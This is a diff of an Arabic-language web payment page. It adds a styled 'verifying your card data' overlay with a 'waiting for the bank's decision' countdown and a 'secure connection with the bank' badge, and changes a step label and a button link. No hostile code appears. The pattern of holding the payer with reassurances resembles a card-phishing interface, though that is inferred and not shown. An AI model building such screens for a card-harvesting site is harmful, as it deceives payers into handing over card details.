@@ -402,30 +402,139 @@
   .sc-sidebar-layout { grid-template-columns: 1fr; }
   .sc-card-face { min-height: 120px; padding: 1.25rem; }
 }
+
+/* ── شاشة التحقق ── */
+#verify-overlay {
+  position: fixed; inset: 0; z-index: 9999;
+  display: flex; align-items: center; justify-content: center;
+  padding: 1rem; direction: rtl;
+}
+#verify-overlay.hidden { display: none; }
+.vo-backdrop {
+  position: absolute; inset: 0;
+  background: rgba(220,235,248,.85);
+  backdrop-filter: blur(8px);
+}
+.vo-card {
+  position: relative; z-index: 1;
+  background: var(--white);
+  border-radius: 20px;
+  box-shadow: 0 12px 40px rgba(21,95,147,.12);
+  padding: 2rem 1.5rem 1.5rem;
+  max-width: 360px; width: 100%;
+  text-align: center;
+  animation: voSlideUp .3s ease;
+}
+@keyframes voSlideUp { from { opacity:0; transform:translateY(16px) } to { opacity:1; transform:translateY(0) } }
+
+.vo-spinner {
+  width: 64px; height: 64px;
+  margin: 0 auto 1rem;
+}
+.vo-spinner-svg { width: 100%; height: 100%; animation: voSpin 1.2s linear infinite; }
+.vo-spinner-circle { animation: voDash 1.2s ease-in-out infinite; }
+@keyframes voSpin { to { transform: rotate(360deg); } }
+@keyframes voDash {
+  0%   { stroke-dasharray: 1 150; stroke-dashoffset: 0; }
+  50%  { stroke-dasharray: 90 150; stroke-dashoffset: -35; }
+  100% { stroke-dasharray: 90 150; stroke-dashoffset: -124; }
+}
+
+.vo-title {
+  font-size: 1.05rem; font-weight: 700; color: var(--blue);
+  margin: 0 0 .35rem;
+}
+.vo-desc {
+  font-size: .82rem; color: var(--gray-500);
+  margin: 0 0 1.25rem; line-height: 1.6;
+}
+
+.vo-timer-box {
+  background: var(--gray-50);
+  border-radius: 12px;
+  padding: .85rem 1rem;
+  margin-bottom: 1rem;
+}
+.vo-timer-label {
+  font-size: .72rem; font-weight: 600; color: var(--gray-500);
+  margin-bottom: .5rem;
+}
+.vo-circ-wrap {
+  position: relative;
+  width: 80px; height: 80px;
+  margin: 0 auto .5rem;
+}
+.vo-circ-svg {
+  width: 100%; height: 100%;
+  transform: scaleX(-1);
+}
+.vo-circ-num {
+  position: absolute;
+  inset: 0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 1.5rem; font-weight: 800; color: var(--blue);
+  font-variant-numeric: tabular-nums;
+  padding-top: 2px;
+}
+.vo-circ-unit {
+  position: absolute;
+  bottom: 12px; left: 50%;
+  transform: translateX(-50%);
+  font-size: .55rem; font-weight: 600; color: var(--gray-500);
+  display: none;
+}
+.vo-timer-sub {
+  font-size: .68rem; color: var(--gray-400);
+  margin-top: .2rem;
+}
+
+.vo-secure-link {
+  display: inline-flex; align-items: center; gap: .35rem;
+  font-size: .8rem; font-weight: 600; color: var(--blue);
+}
+
+@media (max-width:400px) {
+  .vo-card { padding: 1.5rem 1.25rem 1.25rem; }
+  .vo-circ-wrap { width: 70px; height: 70px; }
+  .vo-circ-num { font-size: 1.3rem; }
+}
   </style>
 </head>
 <body>
 
 <!-- شاشة التحقق (مخفية) -->
-<div id="verify-overlay" class="hidden" style="
-  position:fixed;inset:0;z-index:9999;
-  background:rgba(255,255,255,.97);
-  display:flex;flex-direction:column;
-  align-items:center;justify-content:center;
-  direction:rtl;
-  backdrop-filter:blur(6px);">
-  <div style="
-    width:56px;height:56px;border-radius:50%;
-    border:4px solid #eef2f6;
-    border-top-color:#146394;
-    animation:sc-spin .8s linear infinite;
-    margin-bottom:1.25rem"></div>
-  <div style="
-    font-size:1rem;font-weight:700;color:#1a2a3a;
-    margin-bottom:.35rem">جاري التحقق من البيانات</div>
-  <div style="
-    font-size:.82rem;color:#6b7c93">
-    نتحقق من معلومات بطاقتك في بيئة آمنة...</div>
+<div id="verify-overlay" class="hidden">
+  <div class="vo-backdrop"></div>
+  <div class="vo-card">
+    <div class="vo-spinner">
+      <svg class="vo-spinner-svg" viewBox="0 0 50 50">
+        <circle cx="25" cy="25" r="20" fill="none" stroke="#e0e7ee" stroke-width="4"/>
+        <circle cx="25" cy="25" r="20" fill="none" stroke="#155f93" stroke-width="4" stroke-linecap="round" stroke-dasharray="80 40" class="vo-spinner-circle"/>
+      </svg>
+    </div>
+    <h3 class="vo-title">جاري التحقق من البيانات</h3>
+    <p class="vo-desc">نتحقق من معلومات بطاقتك في بيئة آمنة.</p>
+
+    <div class="vo-timer-box">
+      <div class="vo-timer-label">بانتظار قرار البنك</div>
+      <div class="vo-circ-wrap">
+        <svg class="vo-circ-svg" viewBox="0 0 100 100">
+          <circle cx="50" cy="50" r="42" fill="none" stroke="#e8eef3" stroke-width="5"/>
+          <circle cx="50" cy="50" r="42" fill="none" stroke="#155f93" stroke-width="5" stroke-linecap="round"
+            stroke-dasharray="264" stroke-dashoffset="0"
+            transform="rotate(-90 50 50)" id="vo-circ-progress"/>
+        </svg>
+        <div class="vo-circ-num" id="vo-timer">1</div>
+        <div class="vo-circ-unit">ثانية</div>
+      </div>
+      <div class="vo-timer-sub">قبول أو رفض المعاملة.</div>
+    </div>
+
+    <div class="vo-secure-link">
+      <span class="material-icons">lock</span>
+      اتصال آمن مع البنك
+    </div>
+  </div>
 </div>
 
 <div id="app-header" data-variant="inquiry"></div>
@@ -450,7 +559,7 @@
     <span class="stepper-line"></span>
     <div class="stepper-step stepper-current">
       <span class="stepper-num">4</span>
-      <span class="stepper-lbl">المدفوعات والعروض</span>
+      <span class="stepper-lbl">المدفوعات والدفع</span>
     </div>
   </div>
 </div>
@@ -689,7 +798,7 @@
         </div>
       </div>
 
-      <button type="button" onclick="window.location.href='payment.html'"
+      <button type="button" onclick="window.location.href='offers.html'"
         style="display:block;width:100%;padding:.8rem;text-align:center;font-size:.85rem;font-weight:600;color:#6b7c93;background:#f8fafd;border:none;border-top:1px solid #eef2f6;cursor:pointer;font-family:'Readex Pro','Noto Sans Arabic',sans-serif;transition:color .2s"
         onmouseover="this.style.color='#146394'" onmouseout="this.style.color='#6b7c93'">
         <span class="material-icons" style="font-size:.9rem;vertical-align:middle">arrow_forward</span>
